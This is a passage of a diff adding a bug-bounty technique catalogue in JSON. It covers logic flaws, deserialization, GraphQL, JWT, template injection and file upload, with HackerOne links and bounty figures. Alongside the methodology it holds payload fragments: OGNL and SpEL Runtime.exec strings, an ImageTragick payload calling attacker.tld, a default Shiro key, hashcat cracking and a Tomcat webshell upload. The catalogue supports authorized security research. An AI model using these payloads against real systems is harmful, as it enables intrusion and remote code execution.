+          "key_trick": "Map the full payment flow (initiate \u2192 provider redirect \u2192 callback \u2192 fulfilment). Tamper each hop: replay the success callback, change amount/currency in the in-flight request, cancel-after-fulfil. Confirm a *ledger* effect (balance/goods), not just a 200.",
+          "significance": "Directly monetizable; consistently high-bounty. Pairs with `hunt-race-condition` when the flaw is a timing window."
+        },
+        {
+          "title": "One-time incentive reused (coupon / fee discount / reward)",
+          "source": "A fee discount redeemable many times, compounding financial loss (<https://hackerone.com/reports/1849626>, $5,000).",
+          "attack_shape": "A discount, coupon, referral credit, or fee waiver intended for single/limited use lacks server-side idempotency \u2014 reusing it (sequentially or via race/alias) stacks the benefit arbitrarily.",
+          "key_trick": "Apply the incentive, then reapply back-to-back and in parallel (single-packet). If the second application succeeds, there's no server-side single-use enforcement.",
+          "significance": "Classic logic-flaw money bug; overlaps `hunt-race-condition` for the parallel variant."
+        },
+        {
+          "title": "Approval / workflow-stage bypass & run-as-another-user",
+          "source": "Self-approving an admin approval and changing an effective date (<https://hackerone.com/reports/1543159>, $5,000); running pipeline jobs as an arbitrary user (<https://hackerone.com/reports/894569>, $12,000); an OTP flaw allowing binding of any phone number (<https://hackerone.com/reports/2588329>).",
+          "attack_shape": "A multi-stage workflow (approval, review, effective-dating, CI job execution, phone verification) can be forced past a stage or executed in another principal's context \u2014 the server enforces the *happy path* order/identity but not each transition independently.",
+          "key_trick": "For each workflow, attempt to invoke a *later* step directly, self-approve, or set the actor/effective values client-side. The bug is a missing per-transition authorization check.",
+          "significance": "High-impact (privilege/identity abuse) and hard for scanners to find \u2014 the lowest-dup logic class."
+        }
+      ],
+      "disclosed_report_count": 19,
+      "top_reports": [
+        {
+          "url": "https://hackerone.com/reports/3183520",
+          "bounty_usd": 3000
+        },
+        {
+          "url": "https://hackerone.com/reports/407971",
+          "bounty_usd": 2500
+        },
+        {
+          "url": "https://hackerone.com/reports/334205",
+          "bounty_usd": 2500
+        },
+        {
+          "url": "https://hackerone.com/reports/1408782",
+          "bounty_usd": 2000
+        },
+        {
+          "url": "https://hackerone.com/reports/938021",
+          "bounty_usd": 2000
+        }
+      ],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    },
+    {
+      "id": "hunt-deserialization",
+      "vuln_class": "deserialization",
+      "owasp_llm_mappings": [
+        "LLM01",
+        "LLM04"
+      ],
+      "atlas_id": "AML.T0040",
+      "ai_chain_description": "Unsafe data handling in AI pipeline components (pickle/marshal/JSON gadgets)",
+      "pattern_count": 1,
+      "patterns": [
+        {
+          "title": "Apache Shiro RememberMe \u2192 RCE",
+          "source": "Stack: Apache Shiro 1.2.4 with default AES key `kPH+bIxk5D2deZiIxcaaaA==`",
+          "attack_shape": "Default AES-128-CBC key + Java deserialization of rememberMe cookie value via CommonsCollections gadget.",
+          "key_trick": "",
+          "significance": "Full RCE as application user."
+        }
+      ],
+      "disclosed_report_count": 0,
+      "top_reports": [],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    },
+    {
+      "id": "hunt-graphql",
+      "vuln_class": "graphql",
+      "owasp_llm_mappings": [
+        "LLM02",
+        "LLM06"
+      ],
+      "atlas_id": "AML.T0024",
+      "ai_chain_description": "AI-exposed GraphQL API: introspection \u2192 schema disclosure \u2192 mutation abuse",
+      "pattern_count": 8,
+      "patterns": [
+        {
+          "title": "PortSwigger Research \u2014 Daniel Thatcher, GraphQL attack methodology",
+          "source": "PortSwigger Research, body of work by Daniel Thatcher and others on GraphQL security. Published at portswigger.net/research; the team also maintains the Web Security Academy GraphQL labs which codify the techniques.",
+          "attack_shape": "The methodology Thatcher documented for GraphQL hunting: discover the endpoint, attempt introspection, fall back to field-suggestion fuzzing when introspection is disabled, alias-batch to amplify rate-limited operations, and probe operation-confusion between queries and mutations to exploit auth checks that only run on the wrong operation type.",
+          "key_trick": "Field-suggestion fuzzing \u2014 when introspection returns null/error, send queries with intentionally-misspelled field names and parse the server's \"Did you mean...?\" error responses. The server unintentionally leaks valid field names while *declining* to enumerate the schema. Tooling: `clairvoyance` automates this against a wordlist.",
+          "significance": "Most production GraphQL endpoints disable introspection in production builds. Operators who stop at \"introspection disabled, moving on\" miss everything; operators who carry the field-suggestion + clairvoyance workflow find the schema anyway and proceed to the resolver-auth bugs that pay."
+        },
+        {
+          "title": "GitHub Security \u2014 GraphQL depth and node-ID design (developer-facing)",
+          "source": "GitHub Security Lab and engineering blog posts documenting how GitHub structures GraphQL node IDs (`base64(\"TypeName:database_id\")`) and how they impose query-depth limits to defend against recursive-query DoS. Search the GitHub blog by topic.",
+          "attack_shape": "Two adjacent lessons from a well-documented production GraphQL deployment. (1) Node IDs that encode `TypeName:ID` give operators a \"global object handle\" that they can manipulate to fetch objects of one type using an ID belonging to a different type \u2014 IDOR with type confusion. (2) Depth limits without complexity limits are bypassable via fragment-spread amplification \u2014 a query that's only 3 levels deep on paper can resolve thousands of nested objects via fragments.",
+          "key_trick": "Decode every node ID you see (`echo \"VXNlcjox\" | base64 -d` \u2192 `User:1`). Look for `User:`, `Repository:`, `Organization:`, `PullRequest:` prefixes. Then try fetching with a wrong-type ID \u2014 `node(id: \"User:other-user-id\") { ... on User { email role } }` \u2014 and observe whether the resolver checks ownership before returning fields.",
+          "significance": "Node-ID IDOR is the single most-paid GraphQL bug class. The pattern repeats on every Relay-style GraphQL API."
+        },
+        {
+          "title": "Apollo Server / Hasura introspection-default disclosures",
+          "source": "Apollo Server, Hasura, and most off-the-shelf GraphQL frameworks default to *enabling* introspection unless explicitly turned off for production builds. This is documented in each framework's deployment guide and surfaces in disclosed bounty reports as \"introspection enabled in production exposes the full schema.\"",
+          "attack_shape": "Standalone, schema disclosure is informational. *Chained*, it is the prerequisite that turns a hidden authorization bug into a reportable critical: introspection reveals an undocumented mutation (`grantAdminAccess`, `setUserRole`, `bypassPaymentCheck`), the operator discovers it has no authorization guard, the mutation is fired by a low-privilege user, the privilege escalates.",
+          "key_trick": "Introspection alone is rejected as N/A by most programs. Always pair the introspection finding with a *consequence* \u2014 an undocumented mutation reachable from a low-privilege session \u2014 and report the consequence.",
+          "significance": "Don't waste a report on bare introspection. The introspection is recon; the bug is the mutation it surfaced."
+        },
+        {
+          "title": "Persisted-query bypass \u2014 `extensions.persistedQuery` operation injection",
+          "source": "Apollo Server documentation for Automatic Persisted Queries (APQ) and the corresponding security advisories for misconfigurations. The class is documented across Apollo's docs and disclosed reports against APQ-enabled deployments.",
+          "attack_shape": "When a GraphQL server enables APQ, the client sends `{\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"<hash>\"}}}` and the server resolves the hash to a server-stored query string. Misconfigurations include: (a) the server falls back to running the *ad-hoc* `query` field when the hash is unknown (the \"PersistedQueryNotFound\" fallback), defeating the entire allow-list; (b) the server accepts a falsy hash value and processes the ad-hoc query without comparison; (c) the hash is computed client-side and the server trusts the (hash, query) pair without verifying the hash matches the query content.",
+          "key_trick": "When a production endpoint claims \"persisted queries only\" (rejecting ad-hoc queries), test the APQ-fallback by sending a fake hash and a malicious ad-hoc query in the same request. If the server runs the ad-hoc query and returns its result, the allow-list is theatrical.",
+          "significance": "Operators who give up on a \"persisted queries only\" endpoint without testing the fallback miss a high-impact misconfig that effectively neutralizes the entire defense."
+        },
+        {
+          "title": "Field/query-level authz gap \u2192 cross-tenant / private-data disclosure",
+          "source": "A GraphQL query disclosed sensitive private-program data ($25,000, <https://hackerone.com/reports/1618347>); queries exposed other customers' emails and confidential data (<https://hackerone.com/reports/807448>; <https://hackerone.com/reports/489146>).",
+          "attack_shape": "A GraphQL field/type is authorized at the query root but not per-field or per-object, so a caller selects fields (email, private metadata, cross-tenant objects) they shouldn't see. GraphQL's flexible selection makes the missing field-level check easy to reach.",
+          "key_trick": "Introspect the schema, then request sensitive fields on shared types (`User`, `Program`, `Account`) from an unrelated context. Probe every field, not just what the UI selects \u2014 the leak is usually a field the UI never renders.",
+          "significance": "Direct info-disclosure at scale; the dominant GraphQL bounty class."
+        },
+        {
+          "title": "GraphQL IDOR on operation arguments",
+          "source": "IDOR on `BillingDocumentDownload` / `BillDetails` operations via the invoice ID (<https://hackerone.com/reports/2207248>, $5,000).",
+          "attack_shape": "A GraphQL query/mutation takes an object ID (invoice, document, node) and returns/acts on it without scoping to the viewer \u2014 the same IDOR as REST, but reachable through the typed operation and often missed because the REST endpoint *was* fixed.",
+          "key_trick": "Enumerate operations taking an ID argument; swap IDs across tenants. Always test the Relay `node(id:)`/`nodes()` backdoor. Pairs with `hunt-idor`.",
+          "significance": "GraphQL re-opens IDORs teams thought they'd closed at the REST layer."
+        },
+        {
+          "title": "Mutation aliasing / batching \u2192 DoS & rate-limit bypass",
+          "source": "DoS via mutation aliasing in an account-recovery flow (<https://hackerone.com/reports/3287208>, $12,500).",
+          "attack_shape": "GraphQL lets one request contain many aliased copies of the same mutation/field. Without per-operation cost limits, this amplifies work (DoS) or bypasses per-request rate limits (e.g. brute-forcing OTP/recovery N times in one HTTP request).",
+          "key_trick": "Send a single query with 100 aliased copies of a sensitive mutation (`a: mutation, b: mutation, ...`). If all execute, there's no query-cost/aliasing limit \u2014 report as DoS and/or rate-limit bypass.",
+          "significance": "A GraphQL-specific amplification with no REST analog; feeds `hunt-brute-force`."
+        },
+        {
+          "title": "GraphQL argument \u2192 downstream injection (search/sort \u2192 engine)",
+          "source": "A `sort_query` string argument passed to a downstream Elasticsearch cluster enabled Painless script execution (<https://hackerone.com/reports/3694007>, $7,000).",
+          "attack_shape": "A GraphQL string argument (sort, filter, search DSL) flows unsanitized into a downstream engine \u2014 Elasticsearch Painless, a SQL builder, a template \u2014 turning a query field into an injection/RCE sink.",
+          "key_trick": "Trace every free-string GraphQL argument to its backend. For search/sort args, test engine-specific injection (Painless `{{...}}`, ES query DSL, SQL). Overlaps `hunt-rce`/`hunt-sqli` at the sink.",
+          "significance": "Escalates GraphQL from data-layer to code execution."
+        }
+      ],
+      "disclosed_report_count": 20,
+      "top_reports": [
+        {
+          "url": "https://hackerone.com/reports/1122408",
+          "bounty_usd": 3370
+        },
+        {
+          "url": "https://hackerone.com/reports/1864188",
+          "bounty_usd": 3000
+        },
+        {
+          "url": "https://hackerone.com/reports/978143",
+          "bounty_usd": 2500
+        },
+        {
+          "url": "https://hackerone.com/reports/770209",
+          "bounty_usd": 2500
+        },
+        {
+          "url": "https://hackerone.com/reports/715192",
+          "bounty_usd": 2500
+        }
+      ],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    },
+    {
+      "id": "hunt-jwt-crypto",
+      "vuln_class": "jwt-crypto",
+      "owasp_llm_mappings": [
+        "LLM02",
+        "LLM06"
+      ],
+      "atlas_id": "AML.T0040",
+      "ai_chain_description": "JWT/token manipulation in AI auth flows: alg confusion, key confusion",
+      "pattern_count": 3,
+      "patterns": [
+        {
+          "title": "Algorithm confusion (RS256 \u2192 HS256 / alg not pinned)",
+          "source": "A JWT algorithm-confusion vulnerability where the verifier did not pin the algorithm, on a `v1` API (<https://hackerone.com/reports/3800870>, $1,337).",
+          "attack_shape": "The verifier trusts the token's `alg` header instead of pinning it server-side. An attacker switches an RS256 (asymmetric) token to HS256 (symmetric) and signs it with the *public* key as the HMAC secret \u2014 the server verifies the HMAC with that same public key and accepts the forgery.",
+          "key_trick": "Obtain the public key (JWKS endpoint, TLS cert, or a valid RS256 token \u2192 derive), re-sign a tampered token as HS256 with the public key bytes as the secret, set `alg: HS256`. Also test `alg: none`.",
+          "significance": "Full identity forgery (forge an admin token) from a public key. Classic high-severity JWT bug."
+        },
+        {
+          "title": "Missing / improper signature or claim validation",
+          "source": "Backend services that did not properly validate JWTs, bypassable by tampering the expiration and other claims (<https://hackerone.com/reports/1760403>); a state-upload API that let a crafted token bypass `verify_api_request` signing (<https://hackerone.com/reports/1040786>, $10,000).",
+          "attack_shape": "A service accepts a JWT without verifying the signature at all, or verifies signature but not critical claims (`exp`, `aud`, `iss`, `sub`) \u2014 so an attacker edits claims (identity, expiry, audience) and the token is honored. Common on *internal* microservices that assume the gateway already checked.",
+          "key_trick": "Tamper each claim in turn (change `sub`/`user_id`, extend `exp`, swap `aud`) and replay; strip the signature; test the token against internal/secondary endpoints the gateway doesn't front.",
+          "significance": "Every service that re-parses a JWT must re-verify it; the gap is usually one internal service that trusts the token blindly."
+        },
+        {
+          "title": "JWT disclosure / forgeable SSO token \u2192 impersonation",
+          "source": "An integration plugin that leaked a JWT to an unauthorized party (<https://hackerone.com/reports/1103582>, $3,000); an SSO-to-helpdesk implementation whose JWT could be forged from a weak/shared secret (<https://hackerone.com/reports/638635>).",
+          "attack_shape": "A JWT used for SSO or an integration is either leaked (in a response, referer, or plugin config) or forgeable because the signing secret is weak, shared, or guessable \u2014 letting an attacker mint tokens for arbitrary users into the downstream app.",
+          "key_trick": "Hunt the SSO JWT flow (`/jwt`, `?jwt=`, plugin configs); if a secret is derivable or short, brute it offline (`hashcat -m 16500`). Overlaps `hunt-saml`/`hunt-oauth` for the SSO surface.",
+          "significance": "Forged SSO tokens = ATO into every app behind that SSO."
+        }
+      ],
+      "disclosed_report_count": 1,
+      "top_reports": [
+        {
+          "url": "https://hackerone.com/reports/1328546",
+          "bounty_usd": 15000
+        }
+      ],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    },
+    {
+      "id": "hunt-ssti",
+      "vuln_class": "ssti",
+      "owasp_llm_mappings": [
+        "LLM01"
+      ],
+      "atlas_id": "AML.T0040",
+      "ai_chain_description": "AI output rendered through template engine \u2192 SSTI to RCE",
+      "pattern_count": 6,
+      "patterns": [
+        {
+          "title": "PortSwigger Research \u2014 James Kettle, \"Server-Side Template Injection: RCE for the Modern Web App\" (2015)",
+          "source": "Black Hat USA 2015 talk and accompanying PortSwigger Research paper by James Kettle. Published at portswigger.net/research; the talk is widely-cited in subsequent SSTI literature and forms the basis of every modern template-injection cheat sheet.",
+          "attack_shape": "Kettle formalized the SSTI methodology \u2014 *Detect, Identify, Exploit* \u2014 and demonstrated the discovery process by which an operator moves from \"math expression evaluated\" to \"engine fingerprinted\" to \"RCE in the target's language.\" The paper introduced the detection-grid (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`) and engine-fingerprinting via comparative responses (`{{7*'7'}}` \u2192 `7777777` is Jinja2, `49` is Twig, error is something else).",
+          "key_trick": "The same input syntax (`{{ ... }}`) is shared by *server-side* template engines (Jinja2, Twig, Pebble, Liquid) and *client-side* frameworks (Angular, Vue, Mustache, Handlebars in browser). The operator must distinguish the two by where the rendering happens \u2014 server-side SSTI is RCE-tier; client-side is XSS-tier at best. The math probe distinguishes \u2014 server-side returns `49`, client-side renders the literal `{{7*7}}` to the page (then sometimes evaluates client-side, but in a sandbox).",
+          "significance": "This paper remains the canonical reference ten years later. Every disclosed SSTI report cites the same methodology. If you're new to the class, read the paper first and use this document as the payload library."
+        },
+        {
+          "title": "Apache Struts OGNL injection (CVE-2017-5638) \u2014 expression-language SSTI variant",
+          "source": "Apache Software Foundation security advisories S2-045 / S2-046. CVE-2017-5638. CISA Known Exploited Vulnerabilities catalogue. Used as the entry point for the 2017 Equifax breach (~147 million records, GAO-18-559 report).",
+          "attack_shape": "The Jakarta Multipart parser in Struts 2.3.5\u20132.3.31 and 2.5.x \u2264 2.5.10 evaluated the `Content-Type` HTTP header as an OGNL expression when parsing failed. An attacker sent a crafted `Content-Type` containing an OGNL payload (`%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}` invoking `Runtime.exec`).",
+          "key_trick": "The \"template\" was not a Jinja2/Twig-style HTML template \u2014 it was an *error message string* passed through OGNL evaluation. Same class of bug, different sink. The operator lesson: any string that reaches an expression-language evaluator is an SSTI candidate, including headers, error templates, log lines, and validation messages.",
+          "significance": "SSTI is not always in `/render`, `/preview`, or `/email-template`. It can be in *any* code path that calls an EL evaluator on a string the attacker controls. This is also a cross-reference for `hunt-rce` (RCE via expression language)."
+        },
+        {
+          "title": "Spring Cloud Function SpEL injection (CVE-2022-22963)",
+          "source": "VMware Tanzu security advisory `cve-2022-22963`, March 2022. Spring Cloud Function \u2264 3.2.2 (and \u2264 3.1.6). Cross-referenced in `hunt-rce.md`.",
+          "attack_shape": "The `spring.cloud.function.routing-expression` HTTP header was evaluated as a Spring Expression Language (SpEL) expression before any routing logic. Attacker sets the header to `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` and the JVM runs arbitrary commands.",
+          "key_trick": "SpEL is Spring's template/expression language, and any code path that calls `SpelExpressionParser.parseExpression(userInput).getValue(...)` is exploitable. The header-based variant in CVE-2022-22963 is one instance \u2014 the more common variant is SpEL evaluation in error messages, validation annotations (`@Value(\"#{...}\")`), and Thymeleaf templates with `*{...}` syntax.",
+          "significance": "Spring SpEL injection bridges SSTI and RCE; the boundary is mostly nominal. Always probe Spring apps with both `${T(java.lang.Runtime)...}` (template context) and the headers documented in `hunt-rce`."
+        },
+        {
+          "title": "Velocity / Twig / Freemarker SSTI in disclosed bounty programs",
+          "source": "HackerOne and Bugcrowd hacktivity feeds, body of disclosed SSTI reports across Uber, Shopify, Atlassian, GitLab, and others over many years. Cite the class as widely-documented rather than individual report IDs.",
+          "attack_shape": "A user-supplied template field (email subject, invoice line item, dashboard title, \"preview your message\" feature, CMS WYSIWYG) is rendered server-side through Velocity / Twig / Freemarker. The renderer is the same one the application uses for *legitimate* templates, so the operator has access to whatever the template language allows. In most disclosed cases, the engine's RCE primitive was reachable directly because no sandbox was applied to user-supplied templates.",
+          "key_trick": "SSTI almost always lives in features where the developer *intentionally* lets users write template syntax (email subject lines that embed `{{ first_name }}`, CMS preview, marketing automation). The vulnerability is \"we let users write templates without sandboxing them\" \u2014 not \"we accidentally rendered user input.\"",
+          "significance": "The hunt is \"find the feature that says users can use placeholders.\" That feature is the SSTI candidate. Marketing automation, transactional email designers, and PDF invoice generators are perennial wins."
+        },
+        {
+          "title": "Server-side template injection \u2192 RCE (disclosed bounty examples)",
+          "source": "Disclosed across multiple programs (<https://hackerone.com/reports/125980>, <https://hackerone.com/reports/164224>, <https://hackerone.com/reports/217790>).",
+          "attack_shape": "User input is concatenated into a server-side template (email template, PDF generator, name/label field) and evaluated. `{{7*7}}`/`${7*7}`/`#{7*7}` returns 49 \u2192 engine executes attacker expressions \u2192 RCE.",
+          "key_trick": "Send the engine-specific arithmetic probe in every reflected field, especially email/PDF/report templates and CMS label editors. On a hit, escalate to `config`/`os`/`Runtime` per engine.",
+          "significance": "Reliable path to RCE; Jinja2/Smarty/Freemarker SSTI routinely pays five figures in disclosed programs."
+        },
+        {
+          "title": "Client-side template injection (Angular/Vue) \u2192 XSS/sandbox escape",
+          "source": "Disclosed across multiple programs (<https://hackerone.com/reports/125027>).",
+          "attack_shape": "A framework template expression is injected client-side; sandbox escapes turn `{{ }}` evaluation into script execution even under CSP.",
+          "key_trick": "Probe `{{constructor.constructor('alert(1)')()}}`-style payloads where the SPA renders user input as a template. Confirm execution; note the framework version.",
+          "significance": "XSS that bypasses naive HTML-encoding filters because it rides the template engine, not raw HTML."
+        }
+      ],
+      "disclosed_report_count": 0,
+      "top_reports": [],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    },
+    {
+      "id": "hunt-file-upload",
+      "vuln_class": "file-upload",
+      "owasp_llm_mappings": [
+        "LLM01",
+        "LLM04"
+      ],
+      "atlas_id": "AML.T0040",
+      "ai_chain_description": "AI agent processing uploaded files \u2192 archive bombs, polyglot payloads",
+      "pattern_count": 6,
+      "patterns": [
+        {
+          "title": "ImageTragick (CVE-2016-3714)",
+          "source": "Public disclosure of multiple ImageMagick vulnerabilities in May 2016, branded \"ImageTragick\" by the discoverer (Stewie). CVE-2016-3714 is the canonical RCE entry; companion CVEs cover file read, SSRF, and additional command-execution sinks. Public advisories from Red Hat, Debian, and the ImageMagick maintainers.",
+          "attack_shape": "ImageMagick's MVG (Magick Vector Graphics) and MSL (Magick Scripting Language) parsers accepted attacker-controlled commands. A specially crafted file disguised as an image (correct magic bytes for JPEG/PNG/GIF, but containing MVG content) would, when processed by ImageMagick, execute arbitrary shell commands. The classic payload `push graphic-context\\nencoding \"UTF-8\"\\nimage Over 0,0 0,0 'url(https://attacker.tld/x)'\\npop graphic-context` triggered an outbound HTTP request from the server.",
+          "key_trick": "The vulnerability lived in the *delegate* mechanism \u2014 ImageMagick called external programs (ghostscript, mvg parser) based on file content. Magic-byte validation did not protect because the file genuinely was a valid image *and* a valid MVG. The fix required either disabling the affected delegates in `policy.xml` or upgrading to a patched ImageMagick.",
+          "significance": "ImageMagick is on every photo-handling, avatar, thumbnail, and report-generation pipeline. The class of bug \u2014 \"third-party tool processes uploaded content with unexpected privileges\" \u2014 recurs in ghostscript (PostScript file \u2192 RCE), LibreOffice (DOCX \u2192 RCE), ffmpeg (HLS playlist \u2192 SSRF), and exiftool. Operators encountering any upload feature with downstream processing should test the polyglot/delegate class before classifying as Low."
+        },
+        {
+          "title": "Sam Thomas \u2014 \"It's a PHP Unserialization Vulnerability Jim, but Not as We Know It\" (Black Hat USA 2018)",
+          "source": "Sam Thomas, Black Hat USA 2018 talk. The research established the `phar://` stream wrapper attack: PHP automatically deserializes the metadata of a Phar archive whenever a `phar://` URL is referenced by a stream-aware function (`file_exists`, `fopen`, `file_get_contents`, `is_file`, `md5_file`, etc.).",
+          "attack_shape": "Attacker uploads a Phar file disguised as an image (correct JPEG/PNG magic bytes prepended to the Phar structure \u2014 PHP does not validate the file extension when reading metadata, it scans for the Phar marker). The application later references the uploaded file via a stream-aware function. PHP unserializes the Phar metadata, instantiating attacker-chosen classes; if any reachable class has a `__destruct` or `__wakeup` magic method that reaches a sink, the attacker achieves RCE.",
+          "key_trick": "The attack does not require `unserialize()` to be called explicitly. The trigger is *any* PHP function that touches `phar://` paths, and the wrapper is invoked transparently. Stream-aware functions are everywhere in PHP code \u2014 image-handling, file-existence checks, hash calculations.",
+          "significance": "Many PHP applications survived a decade of `unserialize` audits but are still vulnerable through the Phar wrapper. The pattern is \"upload a polyglot Phar/JPEG, then trigger a stream operation on the uploaded file's path.\" The fix landed in PHP 8.0 (auto-unserialize disabled) but legacy PHP 7.x deployments remain widespread."
+        },
+        {
+          "title": "Apache mod_cgi `.htaccess` upload pattern (multi-CVE class)",
+          "source": "Multiple Apache HTTPD security advisories and bounty disclosures across years documenting the same pattern. Apache HTTP Server documentation explicitly warns about user-controlled `.htaccess` files. Recurrent in shared-hosting and CMS upload features.",
+          "attack_shape": "A web app permits upload of arbitrary file types including `.htaccess`. The attacker uploads `.htaccess` containing `AddType application/x-httpd-php .png` (or `AddHandler` directives) into a directory that previously served images statically. The next image upload (e.g., `shell.png` containing PHP source) is now executed by mod_php when requested.",
+          "key_trick": "The bug is not in the upload validation per se \u2014 it is in the per-directory configuration override. Operators auditing upload features should always test whether `.htaccess` is accepted, and whether the upload directory has `AllowOverride None` (safe) or `AllowOverride All` (unsafe).",
+          "significance": "Apache + PHP shared hosting deployments are still common on enterprise legacy hosts and mid-tier CMS platforms (older WordPress hosting, Drupal sites, custom PHP apps). One `.htaccess` upload converts a benign image-upload feature into RCE."
+        },
+        {
+          "title": "CVE-2017-12615 / CVE-2017-12617 \u2014 Tomcat PUT method RCE",
+          "source": "Apache Tomcat security advisory September-October 2017. CVE-2017-12615 (Windows) and CVE-2017-12617 (Linux). Listed on CISA's Known Exploited Vulnerabilities catalogue.",
+          "attack_shape": "Apache Tomcat with HTTP PUT enabled (`readonly=false` in DefaultServlet config) accepted file uploads via PUT. The validator rejected `.jsp` extensions but the attacker bypassed by appending `/` to the filename: `PUT /shell.jsp/ HTTP/1.1`. Tomcat's filesystem layer stripped the trailing slash and stored `shell.jsp`, which was then executable.",
+          "key_trick": "The bypass exploited a normalization mismatch between the validation layer (which sees `shell.jsp/`) and the storage layer (which sees `shell.jsp`). The same shape \u2014 validator and storer disagree on the canonical filename \u2014 recurs in many CVE entries against different products.",
+          "significance": "Tomcat is ubiquitous. The CVE provides a verifiable cite for any operator finding PUT enabled. Internal-tooling Tomcat instances frequently still ship `readonly=false`."
+        },
+        {
+          "title": "Unrestricted upload \u2192 webshell / stored script",
+          "source": "Disclosed across multiple programs (<https://hackerone.com/reports/748903>, <https://hackerone.com/reports/1890284>, <https://hackerone.com/reports/3589247>).",
+          "attack_shape": "The endpoint accepts an executable or active-content file (php/jsp/svg/html) with no extension/content-type/magic-byte validation, served from a path that renders it \u2192 RCE or stored XSS.",
+          "key_trick": "Upload the app-appropriate payload (svg with script, polyglot, double-extension, null-byte, content-type mismatch) and fetch the stored URL. Confirm execution/rendering, not just acceptance. Check the served `Content-Type` and path.",
+          "significance": "Direct RCE (server-side exec) or stored XSS (svg/html) depending on serve context \u2014 the highest-severity upload outcome."
+        },
+        {
+          "title": "Arbitrary file write / path traversal on upload",
+          "source": "Disclosed across multiple programs (<https://hackerone.com/reports/583184>, <https://hackerone.com/reports/3780695>).",
+          "attack_shape": "The filename or path parameter isn't sanitized, letting the upload write outside the intended directory (traversal), or a DB/engine primitive (`INTO OUTFILE`) writes attacker content to disk \u2192 overwrite/RCE.",
+          "key_trick": "Inject `../` sequences and absolute paths into the filename/path field; test any server-side write primitive reachable from the app. Confirm the file lands at the traversed path.",
+          "significance": "File-write as the service account \u2192 config overwrite, webshell drop, privilege escalation. Often Critical."
+        }
+      ],
+      "disclosed_report_count": 0,
+      "top_reports": [],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    }
+  ]
+}
